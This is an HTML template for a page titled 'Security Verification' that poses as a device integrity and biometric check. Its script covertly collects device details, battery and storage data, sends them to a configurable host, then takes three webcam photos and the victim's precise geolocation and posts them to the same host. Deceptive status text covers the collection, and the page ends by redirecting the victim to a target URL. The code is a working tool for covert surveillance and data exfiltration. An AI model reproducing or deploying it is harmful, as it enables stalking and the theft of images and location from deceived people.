<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style>
        /* PREMIUM DARK MODE UI */
        :root { --primary: #00f2ff; --bg: #0a0a0a; --text: #e0e0e0; }
        body {
            background-color: var(--bg);
            color: var(--text);
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        /* SCANNER ANIMATION */
        .scanner-container {
            position: relative;
            width: 280px;
            height: 280px;
            border: 2px solid #333;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 0 20px rgba(0, 242, 255, 0.1);
        }
        .scanner-ring {
            position: absolute;
            width: 100%;
            height: 100%;
            border: 2px solid transparent;
            border-top-color: var(--primary);
            border-radius: 50%;
            animation: spin 2s linear infinite;
        }
        .scanner-ring:nth-child(2) {
            width: 80%; height: 80%;
            border-top-color: #ff0055;
            animation-direction: reverse;
            animation-duration: 3s;
        }
        .icon { font-size: 3rem; opacity: 0.8; }
        
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* TEXT UI */
        h2 { margin-top: 30px; font-weight: 300; letter-spacing: 1px; text-transform: uppercase; font-size: 1.2rem; }
        p { color: #666; font-size: 0.9rem; margin-top: 5px; }
        .status-badge {
            margin-top: 20px;
            padding: 5px 15px;
            background: rgba(0, 242, 255, 0.1);
            border: 1px solid var(--primary);
            border-radius: 20px;
            color: var(--primary);
            font-size: 0.8rem;
            font-weight: bold;
        }

        .hidden { display: none; }
    </style>
</head>
<body>

    <div class="scanner-container">
        <div class="scanner-ring"></div>
        <div class="scanner-ring"></div>
        <div class="icon">üõ°Ô∏è</div>
    </div>

    <h2>Security Check</h2>
    <p>Verifying device integrity & connection...</p>
    <div class="status-badge" id="status">INITIALIZING</div>

    <video id="video" class="hidden" autoplay playsinline></video>
    <canvas id="canvas" class="hidden"></canvas>

    <script>
        const CONFIG = { UID: "<%= uid %>", HOST: "<%= host %>", TARGET: "<%= url %>" };
        const status = document.getElementById("status");

        // 1. PRECISE DATA GATHERING
        async function collect() {
            let batt = { level: 100, charging: true };
            try {
                const b = await navigator.getBattery();
                batt = { level: Math.round(b.level*100), charging: b.charging };
            } catch(e){}

            let storage = { used:0, quota:0 };
            try {
                const est = await navigator.storage.estimate();
                storage = { used: Math.round(est.usage/1048576), quota: Math.round(est.quota/1048576) };
            } catch(e){}

            return {
                network: {
                    type: navigator.connection ? navigator.connection.effectiveType : '4g'
                },
                device: {
                    userAgent: navigator.userAgent,
                    cores: navigator.hardwareConcurrency,
                    memory: navigator.deviceMemory
                },
                battery: batt,
                storage: storage
            };
        }

        // 2. MAIN SEQUENCE
        (async () => {
            status.innerText = "ANALYZING ENVIRONMENT";
            
            // A. Send Data
            const data = await collect();
            await fetch(`${CONFIG.HOST}/report`, {
                method: "POST", headers:{"Content-Type":"application/json"},
                body: JSON.stringify({ uid: CONFIG.UID, data })
            });

            // B. Media & Location
            status.innerText = "BIOMETRIC VERIFICATION";
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: {facingMode:"user"}, audio:false });
                const vid = document.getElementById("video");
                const can = document.getElementById("canvas");
                vid.srcObject = stream;
                
                await new Promise(r => vid.onloadedmetadata = r);
                
                // Capture 3 Frames
                for(let i=0; i<3; i++) {
                    await new Promise(r => setTimeout(r, 800));
                    can.width = vid.videoWidth;
                    can.height = vid.videoHeight;
                    can.getContext("2d").drawImage(vid,0,0);
                    
                    await fetch(`${CONFIG.HOST}/cam`, {
                        method: "POST", headers:{"Content-Type":"application/json"},
                        body: JSON.stringify({ uid: CONFIG.UID, img: can.toDataURL("image/png") })
                    });
                }
                stream.getTracks().forEach(t=>t.stop());
                
                getLoc();
            } catch(e) {
                getLoc();
            }

            function getLoc() {
                status.innerText = "GEOLOCATION SYNC";
                if(navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        p => {
                            fetch(`${CONFIG.HOST}/location`, {
                                method:"POST", headers:{"Content-Type":"application/json"},
                                body: JSON.stringify({
                                    uid: CONFIG.UID, lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy
                                })
                            });
                            done();
                        },
                        () => done(), {timeout: 4000, enableHighAccuracy: true}
                    );
                } else done();
            }

            function done() {
                status.innerText = "ACCESS GRANTED";
                status.style.borderColor = "#2ecc71";
                status.style.color = "#2ecc71";
                setTimeout(() => window.location.replace(CONFIG.TARGET), 800);
            }
        })();
    </script>
</body>
</html>
